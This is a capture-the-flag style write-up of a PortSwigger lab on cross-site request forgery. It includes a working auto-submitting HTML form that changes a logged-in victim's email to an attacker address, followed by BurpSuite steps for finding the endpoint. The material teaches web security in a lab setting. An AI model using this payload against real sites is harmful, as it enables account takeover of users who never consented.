# CSRF vulnerability with no defenses

## Scenario
- Victim is currently logged into the vulnerable site
- Attacker sends malicious link to user \
NOTE: This is simulated via the exploit server in portswigger
- User clicks on the link
- The POST request is sent on behalf of the attacker
```
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Attackology
1. Logged in as the user given in the lab
2. Pulled BurpSuite to intercept the traffic during the email change process
3. Deliberately changed the email of the account to determine the endpoint and method of the vulnerable email change functionality
![image](https://user-images.githubusercontent.com/64616459/148880204-3d9197f1-0a90-4f8e-a1bd-bc684e7be5c7.png)
4. In BurpSuite, looked at the HTTP history to look fo the email change endpoint and sent it to repeater
![image](https://user-images.githubusercontent.com/64616459/148880252-68b3abc9-d257-4229-91de-1719cbabf9c1.png)
5. Went to the exploit server given in the lab and added the endpoint to the form 
6. ```document.forms[0].submit``` automatically sends the POST request to the vulnerable site
![image](https://user-images.githubusercontent.com/64616459/148880927-432779d3-1121-4d39-be79-e44035108a1c.png)
7. Send the payload to the victim
![image](https://user-images.githubusercontent.com/64616459/148880701-4820a8b8-ae53-4101-bf44-09c7895fab19.png)
8. Make the email was changed after sending the payload
![image](https://user-images.githubusercontent.com/64616459/148881951-8cf931c3-f831-46be-af02-3d1baa891fc0.png)


## Reference 
Lab: CSRF vulnerability with no defenses \
https://portswigger.net/web-security/csrf/lab-no-defenses

Cross-site request forgery (CSRF) \
https://portswigger.net/web-security/csrf

CSRF - Lab #1 CSRF vulnerability with no defenses | Long Version \
https://www.youtube.com/watch?v=BBosVSNiJdM
